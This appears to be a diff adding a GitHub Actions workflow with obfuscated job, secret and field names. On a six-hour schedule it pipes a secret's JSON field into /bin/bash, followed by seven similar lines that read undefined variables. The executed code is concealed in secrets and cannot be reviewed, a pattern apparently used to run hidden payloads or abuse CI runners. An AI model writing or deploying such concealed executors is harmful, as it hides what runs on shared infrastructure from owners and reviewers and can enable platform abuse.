@@ -1,0 +1,24 @@
+name: zhongyanzhidii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongyanzhidii
+        env:
+          kubtn57542: ${{ secrets.kubtn57542 }}
+        run: |
+          echo $kubtn57542 | jq -r .gwzw130 | /bin/bash
+          echo $tygdr79 | jq -r .jyc5126 | /bin/bash
+          echo $u404 | jq -r .zaxwp38706 | /bin/bash
+          echo $ub348 | jq -r .e18148 | /bin/bash
+          echo $shogq64361 | jq -r .kyxb768 | /bin/bash
+          echo $qpf96 | jq -r .grqb850 | /bin/bash
+          echo $vb5295 | jq -r .u3133 | /bin/bash
+          echo $lidtv25 | jq -r .wjy353 | /bin/bash
+
